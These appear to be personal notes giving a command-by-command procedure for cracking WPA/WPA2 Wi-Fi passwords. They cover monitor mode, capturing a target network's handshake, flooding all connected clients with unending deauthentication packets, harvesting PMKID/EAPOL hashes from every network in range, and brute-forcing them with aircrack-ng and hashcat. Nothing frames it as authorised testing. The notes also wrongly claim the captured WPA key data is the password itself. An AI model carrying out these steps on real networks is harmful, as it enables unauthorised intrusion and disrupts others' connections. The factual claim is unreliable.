-> ifconfig -> wifi adapter interface wlan0 will show

-> now we need to start monitor, before that we need to kill any conflicting processes
> sudo airmon-ng check kill
> sudo airmon-ng start wlan0

now we are in monitor mode 


-> get the list of wifi interfaces to hack
> sudo airodump-ng wlan0


-> now we need to capture the handskae in cap file, also will show the clients connected to this wifi interface 
sudo airodump-ng -w [cap2012] -c [1] --bssid [6C:4C:BC:23:7A:AF] wlan0


-> keep the previous command running, and start sending deauth packets to every devices that are connected (and don't stop sending)
sudo aireplay-ng --deauth 0 -a [6C:4C:BC:23:7A:AF] wlan0



-> now check the previous terminal, at the top right , you have captured a handshake when any of the clients tried to connect back.

-> stop both the processes

-> check the .cap file in your system and open it 
 > wireshark [cap2012.cap]
> protol search : eapol
we need to check the wifi authenticating the client, there will be many wifi to client (you can see the one packet with the larger length).
there unsed 801 Authentication header, will be WPA key data, that is the password, we need to crack it 

-> now you can disable your monitor mode as we don't need it now 

crack using bruteforce:
> sudo aircrack-ng [capfile] -w [wordlist]

----------------------------------------------------> cracking passwords using hashcat (both the eapol and PMKID hashes are in same file)
> sudo apt update 
> hcxdumptool
> hcxpcapngtool

-> stop all the services accessing the wifi network:

sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service


-> Dump the network traffic from all the wifi interfaces currently in the range, let it run for some time

> sudo hcxdumptool -i wlan0 -w [dumpfile.pcapng] -F --rds=1
(also copy the MAC addr/bssid of the network you want to attack, copy that and save it for later)

> ls  ->see the pcap file


-> start the services agin as the monitor part is done 

sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service


-> convert the pcapng file into the format that hashcat understands  (-E outputs the wifi interface name)
> hcxpcapngtool -o [hash] -E [essidlist] dumpfile.pcapng
(open the hash file in the editor and search for the required bssid, remove the rest of the hashes)


-> now crack the hash that we had captured from the pcapng file (mode 22000 is for wpa and wpa2 hash cracking)
> hashcat -m 22000 [hash] wordlist.txt
